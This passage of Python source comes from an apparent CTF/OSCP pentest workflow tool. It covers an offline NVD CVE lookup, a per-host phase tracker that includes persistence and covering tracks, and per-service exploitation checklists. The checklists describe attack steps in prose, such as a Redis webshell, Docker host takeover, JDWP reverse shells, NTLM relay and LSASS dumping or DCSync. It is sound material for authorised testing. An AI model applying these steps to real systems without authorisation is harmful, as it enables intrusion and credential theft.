# version can't be mapped precisely and would produce false positives).
_CVE_STORE_CAP = 20        # newest CVEs kept per service (keeps findings readable)

# The same product often carries a different CPE vendor/product in nmap output than
# the one(s) NVD files its CVEs under. Map the nmap pair to the canonical NVD pair(s)
# that actually hold the CVEs; the lookup queries the original AND every alias and
# unions the results, so nothing is silently missed (some products span two vendors,
# e.g. rabbitmq under pivotal_software and broadcom).
_CPE_ALIAS = {
    ("mysql", "mysql"):                 [("oracle", "mysql")],
    ("nginx", "nginx"):                 [("f5", "nginx")],
    ("igor_sysoev", "nginx"):           [("f5", "nginx")],
    ("elasticsearch", "elasticsearch"): [("elastic", "elasticsearch")],
    ("squid", "squid"):                 [("squid-cache", "squid")],
    ("isc", "bind9"):                   [("isc", "bind")],
    ("vsftpd", "vsftpd"):               [("redhat", "vsftpd")],
    ("proftpd", "proftpd"):             [("proftpd_project", "proftpd")],
    ("rabbitmq", "rabbitmq"):           [("pivotal_software", "rabbitmq"),
                                         ("broadcom", "rabbitmq_server")],
    ("pureftpd", "pureftpd"):           [("pureftpd", "pure-ftpd")],
}


def _ver_key(v: "str | None") -> tuple:
    """Version as a tuple of its numeric components, e.g. '8.2p1' → (8, 2, 1).
    Good enough to order/compare the version strings NVD uses in its ranges."""
    return tuple(int(x) for x in re.findall(r"\d+", v or ""))


def _ver_cmp(a: "str | None", b: "str | None") -> int:
    """-1 / 0 / 1 comparing two version strings by their numeric components."""
    ta, tb = _ver_key(a), _ver_key(b)
    n = max(len(ta), len(tb))
    ta += (0,) * (n - len(ta))
    tb += (0,) * (n - len(tb))
    return (ta > tb) - (ta < tb)


def _cve_sort_key(cve: str) -> tuple:
    """Sort CVE ids newest-first (by year, then sequence)."""
    m = re.match(r"CVE-(\d+)-(\d+)", cve)
    return (-int(m.group(1)), -int(m.group(2))) if m else (0, 0)


def _cpe_parts(cpe: "str | None") -> "tuple | None":
    """(vendor, product, version) from a CPE 2.2 (cpe:/a:v:p:ver) or 2.3
    (cpe:2.3:a:v:p:ver:…) URI. version is None when absent/any ('*'/'-')."""
    if not cpe or not cpe.startswith("cpe:"):
        return None
    body = cpe[4:]
    if body.startswith("/"):                       # 2.2
        f = body[1:].split(":")
    elif body.startswith("2.3:"):                  # 2.3
        f = body[4:].split(":")
    else:
        return None
    if len(f) < 3:
        return None
    vendor, product = f[1], f[2]
    version = f[3] if len(f) > 3 else None
    version = None if version in ("", "*", "-") else version
    if not vendor or not product:
        return None
    return vendor, product, version


def _ver_in_match(version: str, exact, vsi, vse, vei, vee) -> bool:
    """True when ``version`` satisfies one NVD cpeMatch row — deliberately strict, to
    show fewer but better-verified CVEs (less noise) rather than everything NVD lists:

      • exact version: matched only when the fingerprint is at least as precise as the
        exact value (so a bare major like '4' is NOT taken as '4.0.0' and does not match
        every '4.x' exact row — the biggest false-positive source).
      • ranges: only *closed* ranges (a start bound AND an end bound) count, and only for
        a fingerprint with ≥2 numeric components. Open-ended rows ('< X' / '>= X' only,
        or 'all versions') are dropped — they match huge, cross-branch swaths of versions.
    """
    vk = _ver_key(version)
    if exact:
        ek = _ver_key(exact)
        if len(vk) < len(ek):
            return False                   # fingerprint too coarse to claim this version
        n = max(len(vk), len(ek))
        return vk + (0,) * (n - len(vk)) == ek + (0,) * (n - len(ek))
    if len(vk) < 2:
        return False                       # bare major — too coarse to place in a range
    if not ((vsi or vse) and (vei or vee)):
        return False                       # open-ended / unbounded range — dropped
    if vsi and _ver_cmp(version, vsi) < 0:
        return False
    if vse and _ver_cmp(version, vse) <= 0:
        return False
    if vei and _ver_cmp(version, vei) > 0:
        return False
    if vee and _ver_cmp(version, vee) >= 0:
        return False
    return True


def _cve_lookup(vendor: str, product: str, version: str) -> "list | None":
    """Matching CVE ids (newest first) for one vendor/product/version, or None when
    the index is missing/unreadable. Queries the CPE pair plus any aliases (some
    products file CVEs under several NVD vendors) and unions the results."""
    if not os.path.exists(CVE_INDEX_PATH):
        return None
    targets = [(vendor, product)] + _CPE_ALIAS.get((vendor, product), [])
    try:
        con = sqlite3.connect(CVE_INDEX_PATH)
        try:
            rows = []
            for v, p in targets:
                rows += con.execute(
                    "SELECT m.exact_ver, m.vsi, m.vse, m.vei, m.vee, m.cve "
                    "FROM cve_match m JOIN product p ON p.id = m.product_id "
                    "WHERE p.vendor = ? AND p.product = ?", (v, p)).fetchall()
        finally:
            con.close()
    except sqlite3.Error:
        return None
    matched = {cve for exact, vsi, vse, vei, vee, cve in rows
               if _ver_in_match(version, exact, vsi, vse, vei, vee)}
    return sorted(matched, key=_cve_sort_key)


def _run_cve_lookup(ip: str) -> list:
    """Per versioned service CPE on the host, the CVEs it maps to.
    Returns [(port, proto, product, version, [cve, …]), …]."""
    results = []
    for (port, proto), (_name, product_s, version_s, cpe) in sorted(fetch_services(ip).items()):
        parts = _cpe_parts(cpe)
        if not parts:
            continue
        vendor, product, cpe_ver = parts
        version = cpe_ver or version_s
        if not version or not re.search(r"\d", version):
            continue                               # need a concrete version
        cves = _cve_lookup(vendor, product, version)
        if cves:
            results.append((port, proto, product, version, cves))
    return results


def save_cve_findings(ip: str, results: list) -> None:
    """Replace this host's CVE-lookup findings in the vulns table (script
    'cve-lookup', one row per port), so re-running the phase stays idempotent."""
    if not ip or _is_self_ip(ip):
        return
    now = datetime.now().isoformat(timespec="seconds")
    with _DB_LOCK:
        conn = _db_connect()
        try:
            conn.execute("DELETE FROM vulns WHERE ip = ? AND script = 'cve-lookup'", (ip,))
            for port, proto, product, version, cves in results:
                cve_str = ",".join(cves[:_CVE_STORE_CAP])
                summary = f"{product} {version} — {len(cves)} known CVE(s)"
                conn.execute(
                    "INSERT INTO vulns (ip, port, proto, script, state, cve, risk, summary, "
                    "first_seen, last_seen) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                    (ip, port, proto, "cve-lookup", "CVE", cve_str, "INFO", summary, now, now))
            conn.commit()
        finally:
            conn.close()


def _do_cve_lookup(ip: str) -> None:
    """Run the offline lookup for one host, store findings, log a job, print a recap."""
    name = _PHASES["4"][0]
    job = _new_job("4", f"{name} · {ip}", f"cve-index lookup (offline NVD) for {ip}")
    results = []
    try:
        results = _run_cve_lookup(ip)
        save_cve_findings(ip, results)
        lines = [f"CVE lookup — {ip} (offline NVD index)"]
        for port, proto, product, version, cves in results:
            lines.append(f"{port}/{proto}  {product} {version}  {len(cves)} CVE")
            shown = cves[:_CVE_STORE_CAP]
            lines.append("  " + ", ".join(shown)
                         + (f"  (+{len(cves) - len(shown)} more)" if len(cves) > len(shown) else ""))
        job["output"], job["hosts"], job["state"] = "\n".join(lines), len(results), "done"
    except Exception as exc:
        job["state"], job["error"] = "error", str(exc)
    finally:
        _job_update(job)

    if not results:
        print(f"\n{DIM}▸ CVE lookup — {ip}: no versioned service CPE matched the index "
              f"(run {BOLD}[2] Service detection{RESET}{DIM} first, or no known CVEs){RESET}")
        return
    total = sum(len(cves) for *_rest, cves in results)
    print(f"\n{GREEN}▶ CVE lookup done{RESET} {DIM}({ip} · {len(results)} service(s), {total} CVE) — "
          f"see {BOLD}[f] findings{RESET}{DIM} · {BOLD}[s] status{RESET}")


def _handle_cve_lookup() -> None:
    """Phase 5 flow: read a target IP and match its service CPEs to known CVEs."""
    if not os.path.exists(CVE_INDEX_PATH):
        print(f"\n{YELLOW}⚠ CVE index not found{RESET} {DIM}({os.path.basename(CVE_INDEX_PATH)}) "
              f"— build it with the installer's NVD step, then retry{RESET}")
        return
    while True:
        value = _ctx_ask("cve", "<single IP> · [h] help · [b] back · [m] menu")
        if value is None or value.lower() in _BACK_WORDS:
            return
        if value.lower() in _HELP_WORDS:
            print_help()
            continue
        try:
            ip = str(ipaddress.ip_address(value))
        except ValueError:
            print(f"{RED}✗ give one valid IP address{RESET}")
            continue
        if not fetch_services(ip):
            print(f"{DIM}note: no services recorded for {ip} — run {BOLD}[2] Service "
                  f"detection{RESET}{DIM} first{RESET}")
            continue
        _do_cve_lookup(ip)
        return


# ── progress (per-host workflow tracker) ──────────────────────────────────────
def _host_job_states(ip: str) -> dict:
    """Aggregated command-history state per phase for one host. A phase spawns several
    commands (parallel nmap passes / script families), so its state is combined across
    all of them: 'running' while ANY is still running, and only settling to
    'done'/'error'/'aborted' once they have all finished — so progress never flips to
    complete mid-scan. A job belongs to the host when the IP appears as a whole token in
    its command or name."""
    pat = re.compile(r"(?<!\d)" + re.escape(ip) + r"(?!\d)")
    with _JOBS_LOCK:
        jobs = list(_JOBS)
    per_phase: dict = {}
    for j in jobs:
        if pat.search(j.get("command") or "") or pat.search(j.get("name") or ""):
            per_phase.setdefault(j["phase"], []).append(j["state"])
    return {phase: _agg_state(sts) for phase, sts in per_phase.items()}


def _agg_state(states: list) -> str:
    """Combine several command states into one: 'running' while any is still going;
    else a success ('done') settles it; 'error'/'aborted' only when nothing completed."""
    if "running" in states:
        return "running"
    if "done" in states:
        return "done"
    if "error" in states:
        return "error"
    if "aborted" in states:
        return "aborted"
    return states[-1] if states else "done"


def _render_host_progress(ip: str) -> None:
    """Per-host workflow tracker: for every phase, show whether it has run for this host
    (evidence in the DB) and its current state from the command history — so it's clear
    what's complete, what's mid-run and what hasn't been done yet."""
    known = any(r[0] == ip for r in fetch_hosts())
    ports = fetch_ports(ip)
    services = fetch_services(ip)
    host_scripts = fetch_scripts(ip, 0, "")
    scripted = fetch_scripted_ports(ip)
    vulns = fetch_vulns(ip)
    # Phase 3's -sC feeds the same vulns table (http-methods, ssl-cert… all state INFO),
    # so findings alone don't prove the vuln scan ran. Count only what the vuln category
    # emits and -sC does not — VULNERABLE/LIKELY; a phase-4 job (persisted) also marks it.
    vuln_findings = [v for v in vulns if v[3] in ("VULNERABLE", "LIKELY")]   # phase 4
    cve_findings = [v for v in vulns if v[3] == "CVE"]       # phase 5
    n_cve = sum(len([c for c in (v[4] or "").split(",") if c.strip()]) for v in cve_findings)
    jobstate = _host_job_states(ip)

    # Phase 2 (port scan) already seeds the services table with nmap's port->name
    # guesses, so a bare name doesn't prove phase 3 ran. Service detection (-sV -sC) is
    # what adds a product/version/CPE or NSE script output — that's the real evidence.
    fingerprinted = [s for s in services.values() if s[1] or s[2] or s[3]]

    # Phase 2 also re-registers the host (save_hosts), so "on record" alone doesn't mean
    # host discovery ran. Prefer the discovery job's own record: if a discovery pass ran
    # this session (its found-set is populated), phase 1 counts only when it found THIS
    # host. With no live discovery job (e.g. a prior session), fall back to "on record".
    with _JOBS_LOCK:
        disc = [j for j in _JOBS if j["phase"] == "0"]
        discovered = any(ip in j["found"] for j in disc)
        live_discovery = any(j["found"] for j in disc)
    phase0_done = discovered or (known and not live_discovery)

    # phase 5 (service exploitation) is complete only when EVERY service's checklist is
    # resolved (done/skip); phase 6 (privesc) when its OS checklist is resolved.
    targets = _exploit_targets(ip)
    n_svc_done = sum(1 for p, pr, _l, k, _v, _s in targets if _service_steps_complete(ip, p, pr, k))
    phase5_done = bool(targets) and n_svc_done == len(targets)
    privesc_done, privesc_detail = _os_checklist_progress(ip, "privesc", _PRIVESC_STEPS)
    persist_done, persist_detail = _os_checklist_progress(ip, "persist", _PERSIST_STEPS)
    cover_done, cover_detail = _os_checklist_progress(ip, "cover", _COVER_STEPS)

    # phase key -> (has evidence in the DB, short detail line)
    evidence = {
        "0": (phase0_done, "on record" if phase0_done else ""),
        "1": (bool(ports), f"{len(ports)} open port(s)" if ports else ""),
        "2": (bool(fingerprinted) or bool(host_scripts) or bool(scripted),
              f"{len(fingerprinted)} fingerprinted" if fingerprinted else ("NSE output" if (host_scripts or scripted) else "")),
        "3": (bool(vuln_findings), f"{len(vuln_findings)} vuln finding(s)" if vuln_findings else ""),
        "4": (bool(cve_findings), f"{n_cve} CVE" if cve_findings else ""),
        "5": (phase5_done, f"{n_svc_done}/{len(targets)} services" if targets else ""),
        "6": (privesc_done, privesc_detail),
        "7": (persist_done, persist_detail),
        "8": (cover_done, cover_detail),
    }

    print(f"\n{BOLD}{ip} — progress{RESET}")
    if not known and not ports and not vulns and not jobstate:
        print(f"  {DIM}nothing recorded for this host yet — run {BOLD}[0] Host discovery{RESET}"
              f"{DIM} / {BOLD}[1] Port enumeration{RESET}{DIM} first{RESET}")
        return

    done = 0
    for key, name, _desc in PHASES:
        has, detail = evidence[key]
        # phases 5-8 are manual checklists (no background jobs) — completion is driven by
        # the checklist evidence above, not job state.
        st = None if key in ("5", "6", "7", "8") else jobstate.get(key)
        if st == "running":
            sym, col, label = "⏳", YELLOW, "running"
        elif has or st == "done":
            sym, col, label = "✓", GREEN, "complete"
            done += 1
        elif st == "error":
            sym, col, label = "✗", RED, "error"
        elif st == "aborted":
            sym, col, label = "⊘", MAGENTA, "aborted"
        else:
            sym, col, label = "○", DIM, "not run"
        extra = f"  {DIM}· {detail}{RESET}" if detail else ""
        print(f"  {col}{sym} [{key}] {name:<20}{RESET} {col}{label:<9}{RESET}{extra}")
    print(f"\n  {DIM}{done}/{len(PHASES)} phase(s) complete{RESET}")


def _launch_phase_for(key: str, ip: str) -> None:
    """Run one workflow phase for a host chosen in the progress view — same launch path
    as the per-phase handlers, but the IP is already known so it's not re-typed."""
    _sync_hosts_block(ip)     # running any command on a host materialises its DB domains → hosts (root)
    if key == "0":
        print(f"{DIM}note: host discovery scans a subnet/range, not one host — use "
              f"{BOLD}[0]{RESET}{DIM} from the menu{RESET}")
        return
    if key == "8":
        _os_checklist_for(ip, "cover", "Covering Tracks", _COVER_STEPS)
        return
    if key == "7":
        _os_checklist_for(ip, "persist", "Persistence", _PERSIST_STEPS)
        return
    if key == "6":
        _os_checklist_for(ip, "privesc", "Privilege Escalation", _PRIVESC_STEPS)
        return
    if key == "5":
        _exploit_targets_view(ip)                            # service exploitation checklist
        return
    if key == "4":
        if not os.path.exists(CVE_INDEX_PATH):
            print(f"\n{YELLOW}⚠ CVE index not found{RESET} {DIM}({os.path.basename(CVE_INDEX_PATH)}) "
                  f"— build it with the installer's NVD step, then retry{RESET}")
            return
        if not fetch_services(ip):
            print(f"{DIM}note: no services recorded for {ip} — run {BOLD}[2] Service "
                  f"detection{RESET}{DIM} first{RESET}")
            return
        _do_cve_lookup(ip)
        return
    # phases 1–3: background nmap scans on a time budget
    if key == "2" and not fetch_ports(ip):
        print(f"{DIM}note: no open ports recorded for {ip} — run {BOLD}[1] Port "
              f"enumeration{RESET}{DIM} first (OS scan still runs if root){RESET}")
    if key == "3" and not fetch_ports(ip):
        print(f"{DIM}note: no open ports recorded for {ip} — run {BOLD}[1] Port "
              f"enumeration{RESET}{DIM} (and {BOLD}[2] Service detection{RESET}{DIM}) first{RESET}")
        return
    name = _PHASES[key][0]
    if key == "3":
        print(f"{DIM}vuln + auth scripting{RESET}")
    module = {"1": "ports", "2": "service", "3": "vuln"}[key]
    minutes = _prompt_minutes(module, name, ip)
    if minutes is None:
        return
    if key == "1":
        _start_port_enum(ip, minutes)
        detail = "fast + full TCP + UDP"
    elif key == "2":
        _start_service_detection(ip, minutes)
        detail = "-sV -sC + OS"
    else:
        _start_vuln_scan(ip, minutes)
        detail = "targeted NSE vuln+auth"
    print(f"\n{GREEN}▶ {name.lower()} running in the background{RESET} "
          f"{DIM}({ip} · {detail}, ⏱ {minutes}m) — check {BOLD}[s] status{RESET}")


def _open_host_progress(ip: str) -> None:
    """Interactive progress view for a known host: run a phase by number, or jump to its
    findings with [f]. Reused from the database (p <n>) and the host's other sub-views."""
    def _handle(_c, v):
        if v == "":
            return "refresh"
        if v == "f":
            _host_findings_view(ip)
            return "refresh"
        if v == "s":
            _status_view()
            return "refresh"
        if v in _PHASES:
            _launch_phase_for(v, ip)
            return "refresh"
        print(f"{RED}✗ unknown option{RESET} {DIM}— <n> run phase · f · s · b · enter{RESET}")
        return "stay"

    _run_view(f"{ip}/progress",
              "[Enter] refresh · <n> run phase · [f] findings · [s] status · [b] back · [m] menu",
              lambda: _render_host_progress(ip), _handle)


# ── service exploitation (phase 6) ────────────────────────────────────────────
# Services are triaged in CTF/OSCP order: the ones that most often give a fast foothold
# or rich enumeration come first, so you know what to hit first. Each entry is
#   (key, label, {typical ports}, (match tokens for cpe/product/name, all lowercased)).
# A service's class is resolved by the cascade CPE → product/version → service name →
# port default — strongest signal first, port number only as a last resort.
_EXPLOIT_SERVICES = [
    ("http",    "HTTP / web app",     {80, 81, 443, 591, 2082, 2087, 3000, 5000, 5601,
                                       7001, 8000, 8008, 8080, 8081, 8443, 8500, 8888,
                                       9000, 9090, 15672},
     ("http", "https", "ssl/http", "nginx", "apache", "httpd", "iis", "tomcat",
      "jetty", "lighttpd", "werkzeug", "gunicorn", "express", "haproxy", "caddy")),
    ("smb",     "SMB / file shares",  {137, 138, 139, 445},
     ("smb", "microsoft-ds", "netbios-ssn", "netbios", "samba", "cifs")),
    ("winrm",   "WinRM (remote shell)", {5985, 5986}, ("winrm", "wsman")),
    ("ftp",     "FTP",                {21, 990, 2121},
     ("ftp", "vsftpd", "proftpd", "pure-ftpd", "filezilla", "ftpd")),
    ("tftp",    "TFTP (UDP)",         {69}, ("tftp",)),
    ("telnet",  "Telnet",             {23}, ("telnet",)),
    ("nfs",     "NFS / RPC mounts",   {111, 2049},
     ("nfs", "rpcbind", "portmap", "mountd")),
    ("afp",     "AFP (Apple shares)", {548}, ("afp", "netatalk", "apple filing")),
    ("rsync",   "rsync",              {873}, ("rsync",)),
    ("distcc",  "distcc (RCE)",       {3632}, ("distcc",)),
    ("redis",   "Redis",              {6379, 6380}, ("redis",)),
    ("memcached", "Memcached",        {11211}, ("memcache",)),
    ("elastic", "Elasticsearch",      {9200, 9300}, ("elasticsearch", "elastic")),
    ("mongodb", "MongoDB",            {27017, 27018}, ("mongodb", "mongod", "mongo")),
    ("couchdb", "CouchDB",            {5984, 6984}, ("couchdb",)),
    ("neo4j",   "Neo4j",              {7474, 7687}, ("neo4j",)),
    ("influxdb", "InfluxDB",          {8086}, ("influxdb", "influx")),
    ("amqp",    "AMQP / RabbitMQ",    {5672}, ("amqp", "rabbitmq")),
    ("epmd",    "Erlang epmd",        {4369}, ("epmd", "erlang port mapper")),
    ("docker",  "Docker API",         {2375, 2376}, ("docker",)),
    ("jdwp",    "Java JDWP (RCE)",    {8787}, ("jdwp", "java debug")),
    ("rmi",     "Java RMI",           {1050, 1098, 1099}, ("rmi", "jrmi")),
    ("clamav",  "ClamAV (RCE)",       {3310}, ("clamav",)),
    ("ajp",     "AJP / Tomcat (Ghostcat)", {8009}, ("ajp13", "ajp")),
    ("svn",     "SVN (svnserve)",     {3690}, ("svn", "subversion")),
    ("mysql",   "MySQL / MariaDB",    {3306}, ("mysql", "mariadb")),
    ("mssql",   "MS SQL Server",      {1433, 1434}, ("ms-sql", "mssql", "microsoft sql")),
    ("psql",    "PostgreSQL",         {5432}, ("postgresql", "postgres")),
    ("oracle",  "Oracle DB",          {1521, 1748, 1754, 1808, 1809, 2100},
     ("oracle", "tns")),
    ("mqtt",    "MQTT (IoT)",         {1883, 8883}, ("mqtt", "mosquitto")),
    ("ldap",    "LDAP / AD",          {389, 636, 3268, 3269}, ("ldap",)),
    ("kerberos", "Kerberos (AD)",     {88, 464}, ("kerberos", "kpasswd")),
    ("msrpc",   "MSRPC endpoint",     {135, 593}, ("msrpc", "epmap")),
    ("snmp",    "SNMP",               {161, 162}, ("snmp",)),
    ("ipmi",    "IPMI (hash leak)",   {623}, ("ipmi", "asf-rmcp")),
    ("dns",     "DNS",                {53}, ("domain", "dns", "bind")),
    ("smtp",    "SMTP / mail",        {25, 465, 587}, ("smtp",)),
    ("mail2",   "POP3 / IMAP",        {110, 143, 993, 995}, ("pop3", "imap")),
    ("irc",     "IRC",                {6660, 6667, 6669, 6697}, ("irc", "ircd", "unreal")),
    ("rdp",     "RDP",                {3389}, ("ms-wbt-server", "rdp", "terminal serv")),
    ("vnc",     "VNC",                {5900, 5901, 5902, 5903}, ("vnc",)),
    ("ssh",     "SSH",                {22, 2222}, ("ssh", "openssh", "dropbear")),
    ("squid",   "Squid proxy",        {3128}, ("squid",)),
    ("cups",    "CUPS / printing",    {631}, ("cups", "ipp")),
    ("jetdirect", "Printer (JetDirect/PJL)", {9100}, ("jetdirect", "pjl")),
    ("rservices", "BSD r-services",   {512, 513, 514}, ("rlogin", "rexec", "rsh", "rshd")),
    ("x11",     "X11",                {6000, 6001, 6002, 6003, 6004, 6005}, ("x11",)),
    ("finger",  "Finger",             {79}, ("finger",)),
    ("ident",   "ident (user enum)",  {113}, ("ident", "identd")),
    ("rtsp",    "RTSP (cameras)",     {554, 8554}, ("rtsp",)),
    ("sip",     "SIP / VoIP",         {5060, 5061}, ("sip",)),
    ("nntp",    "NNTP",               {119}, ("nntp",)),
]
_EXPLOIT_RANK = {key: i for i, (key, *_rest) in enumerate(_EXPLOIT_SERVICES)}
_EXPLOIT_UNKNOWN = ("other", "other / unknown")   # fallback bucket, always ranked last


# Per-service pentest checklist: the steps to work through once a service is picked in
# phase 6. Starter methodology (HTB/OSCP-flavoured) — each service gets a deeper, curated
# pass later. Keyed by the service class key; 'other' is the generic fallback.
_EXPLOIT_STEPS = {
    "http": [
        # ── fingerprint & recon ──
        ("Response headers, status & redirects", "http-headers"),
        ("Fingerprint the web stack & versions", "http-fingerprint"),
        ("Harvest hostnames from the TLS certificate", "ssl-cert"),
        ("Public exploits for the found versions", "searchsploit"),
        # ── manual inspection ──
        ("Mine page source & JS for leaks", "http-source"),
        ("robots / sitemap / .well-known & error pages", "http-wellknown"),
        ("Inspect cookies & sessions; attack JWTs", "http-cookies"),
        # ── content discovery ──
        ("Discover virtual hosts on this IP", "vhost-fuzz"),
        ("Brute-force directories & files", "dir-brute"),
        ("Hunt exposed VCS / backups / config", "vcs-hunt"),
        ("Discover hidden parameters", "param-hunt"),
        # ── CMS enumeration (run early — a vulnerable plugin can shortcut straight to RCE) ──
        ("CMS scan → plugins, themes, users", "cms-scan"),
        # ── authentication & access control ──
        ("Try default / weak creds on logins", "default-creds"),
        ("Test auth bypass & user enumeration", "auth-bypass"),
        ("Targeted brute-force (gated)", "login-brute"),
        ("IDOR / broken access control", "idor-bac"),
        # ── injection & inclusion (OSCP core) ──
        ("Auto-dump via SQLi (OSCP-safe)", "sqli-dump"),
        ("Full SQLi assessment", "sqli-scan"),
        ("LFI / path traversal", "lfi-scan"),
        ("Remote file inclusion (RFI)", "rfi-scan"),
        ("OS command injection → RCE", "cmdi-scan"),
        ("Server-side template injection → RCE", "ssti-scan"),
        ("XXE & SSRF", "xxe-ssrf"),
        # ── land a shell & foothold ──
        ("File upload → webshell", "upload-shell"),
        ("Admin panel → RCE", "admin-rce"),
        # ── shell spawn moved to the Privilege Escalation phase (one place, all services) ──
        # ── manual steps, tailored to what this host exposed ──
        ("Manual steps & further research", "next-steps"),
    ],
    "smb": [
        # ── recon (no creds) ──
        ("Null / guest enumeration", "smb-enum"),
        ("Version-RCE scan (detection only)", "smb-vuln"),
        # ── loot shares ──
        ("Loot readable shares for secrets", "smb-loot"),
        ("SYSVOL / NETLOGON GPP loot", "smb-gpp"),
        # ── poison & relay (no creds) ──
        ("Poison LLMNR / NBT-NS → capture NetNTLM", "smb-poison"),
        ("NTLM relay (signing not required)", "smb-relay"),
        ("Coerce auth → relay to escalate", "smb-coerce"),
        # ── DC-critical CVEs ──
        ("DC CVEs: ZeroLogon, noPac, PrintNightmare (detection only)", "smb-dccve"),
        # ── creds → exec / dump ──
        ("Spray creds & hashes (mind lockout)", "smb-spray"),
        ("Valid creds / hash → shell", "smb-exec"),
        ("Dump SAM / LSA / LSASS; DCSync", "smb-dump"),
        ("Writable share → hash capture / payload", "smb-writable"),
        # ── shell spawn moved to the Privilege Escalation phase (one place, all services) ──
        # ── manual steps, tailored to what this host exposed ──
        ("Manual steps & further research", "smb-next"),
    ],
    "winrm": [
        ("Confirm WinRM transport (5985 HTTP / 5986 HTTPS)", "winrm-enum"),
        ("Validate & spray creds and NTLM hashes against known users (watch lockout)", "winrm-spray"),
        ("Needs 'Remote Management Users' / admin membership — note who has access", "winrm-access"),
        ("Via the shell: enumerate, upload tooling, run commands; reuse creds to pivot", "winrm-recon"),
        # ── shell spawn moved to the Privilege Escalation phase (one place, all services) ──
        # ── manual steps, tailored to what this host exposed ──
        ("Manual steps & further research", "winrm-next"),
    ],
    "ftp": [
        ("Banner & exact version → searchsploit (vsftpd 2.3.4 backdoor, ProFTPD mod_copy CVE-2015-3306)", "ftp-banner"),
        ("Anonymous login (anonymous:<any>) → browse the tree", "ftp-anon"),
        ("Download everything; test write access (upload a throwaway file)", "ftp-write"),
        ("Try known / default / reused creds; targeted brute only if lockout allows", "ftp-creds"),
        ("If FTP root maps to a web root or is writable → drop a webshell / poison a served file", "ftp-webshell"),
        ("FTP-bounce (PORT) to reach & scan internal hosts through the server", "ftp-bounce"),
        # ── shell spawn moved to the Privilege Escalation phase (one place, all services) ──
        # ── manual steps, tailored to what this host exposed ──
        ("Manual steps & further research", "ftp-next"),
    ],
    "tftp": [
        ("Confirm UDP/69 (no auth) + path-traversal read", "tftp-probe"),
        ("Sweep known filenames (configs/boot/backups) → grep creds & secrets", "tftp-grab"),
        ("Test write access (WRQ throwaway) — non-reversible, no DELETE", "tftp-write"),
        ("Manual steps & further research", "tftp-next"),
    ],
    "nfs": [
        "List exports & allowed clients (showmount -e; nmap nfs-*)",
        "Mount each export; test read and write",
        "no_root_squash → plant a root-owned SUID binary for post-foothold privesc",
        "Match / forge local UID-GID to read restricted files (SSH keys, configs)",
        "NFSv4 hides exports from showmount — mount the root and browse",
        "Manual steps & further research",
    ],
    "afp": [
        "Enumerate shares & server info (afp-showmount / afp-serverinfo)",
        "Try guest / anonymous, then known creds",
        "Mount & hunt Time Machine backups, keychains and configs for creds",
        "Manual steps & further research",
    ],
    "rsync": [
        "List modules (rsync rsync://IP:873/)",
        "Access modules unauth; download everything, test upload to writable modules",
        "Read sensitive files (SSH keys, configs); write to a served/executable path if writable",
        "If auth is required, try known / reused creds",
        "Manual steps & further research",
    ],
    "distcc": [
        "Confirm distccd (3632)",
        "CVE-2004-2687 → arbitrary command execution (distcc_exec or manual DIST protocol)",
        "Use the RCE to read files / stage a reverse shell, then pivot to local privesc",
        "Manual steps & further research",
    ],
    "redis": [
        ("INFO + CONFIG (stdlib RESP) → version/role, dir/dbfilename, unauth flag", "redis-probe"),
        ("If AUTH required: default + reused passwords (targeted); else unauth", "redis-auth"),
        ("Loot: requirepass/masterauth, KEYS * → creds/sessions (type-aware, read-only)", "redis-loot"),
        ("RCE: CONFIG SET dir/dbfilename webshell → exec-verified; SSH-key/cron guidance", "redis-rce"),
        ("Manual steps & further research", "redis-next"),
    ],
    "memcached": [
        "stats / stats items / stats slabs / stats cachedump (unauthenticated)",
        "Dump all keys and values — hunt for sessions, tokens and creds",
        "Manual steps & further research",
    ],
    "elastic": [
        "GET / (version) and /_cat/indices?v — unauthenticated",
        "Dump indices & documents for creds and sensitive data (_search)",
        "Old versions → RCE (CVE-2014-3120, CVE-2015-1427 Groovy sandbox bypass)",
        "If auth is on, try default / known creds against the REST API and Kibana (5601)",
        "Manual steps & further research",
    ],
    "mongodb": [
        ("Wire probe (stdlib BSON) → version + role + unauth flag → searchsploit", "mongo-info"),
        ("If auth required: default + reused creds (nmap mongodb-brute); else unauth", "mongo-auth"),
        ("Loot: walk DBs/collections, dump docs → creds/tokens (unauth, read-only)", "mongo-loot"),
        ("Manual steps & further research", "mongo-next"),
    ],
    "couchdb": [
        "GET /_all_dbs and read documents unauthenticated; note version",
        "CVE-2017-12635 → create an admin user (privilege escalation)",
        "CVE-2017-12636 / EMONGO → RCE via query_server config; then reverse shell",
        "Erlang cookie reuse (with epmd) → node RCE",
        "Manual steps & further research",
    ],
    "neo4j": [
        "Browser/API on 7474; try default neo4j:neo4j and known creds",
        "Cypher queries to dump nodes/relationships for creds & data",
        "APOC / version RCE (e.g. CVE-2021-34371, apoc.* file & shell functions)",
        "Manual steps & further research",
    ],
    "influxdb": [
        "CVE-2019-20933 auth bypass (JWT signed with empty shared-secret)",
        "Enumerate databases (SHOW DATABASES) and dump measurements for creds/data",
        "If auth is on, try default / known creds against the HTTP API",
        "Manual steps & further research",
    ],
    "amqp": [
        "Try default guest:guest, then known creds",
        "Reach the management UI (15672) for queues, vhosts, users",
        "Enumerate & drain queues — messages often carry creds / internal data",
        "Erlang cookie (with epmd 4369) → node RCE on RabbitMQ",
        "Manual steps & further research",
    ],
    "epmd": [
        "List Erlang nodes & ports (epmd -names)",
        "Find / guess the Erlang cookie (~/.erlang.cookie, reused across nodes)",
        "Cookie → connect to the node and run erlang:os_cmd → RCE",
        "Common on RabbitMQ / CouchDB clusters — pivot into those",
        "Manual steps & further research",
    ],
    "docker": [
        "Confirm the unauthenticated Docker API (2375/2376)",
        "Enumerate: containers, images, networks (docker -H tcp://IP:2375 ps/images)",
        "Run a privileged container bind-mounting the host / → read/write host filesystem",
        "chroot the mount and add a user / SSH key / cron → root on the host",
        "Loot secrets from images, env vars and volumes",
        "Manual steps & further research",
    ],
    "jdwp": [
        "Confirm the JDWP handshake (Java Debug Wire Protocol)",
        "Any-context RCE via the debugger (jdwp-shellifier / manual breakpoint)",
        "Execute Runtime.exec → reverse shell as the JVM's user",
        "Manual steps & further research",
    ],
    "rmi": [
        "Enumerate the RMI registry — bound objects & remote methods (rmi-dumpregistry, BaRMIe)",
        "Java deserialization RCE against the endpoint (ysoserial gadget chains)",
        "JMX/RMI (if exposed) → MLet MBean → load a malicious MBean for RCE",
        "Manual steps & further research",
    ],
    "ajp": [
        "Confirm AJP13 (8009) and the fronting Tomcat",
        "Ghostcat CVE-2020-1938 → read WEB-INF/web.xml, configs, source",
        "Chain to RCE if you can upload a JSP into a served path (ajpy / metasploit)",
        "Manual steps & further research",
    ],
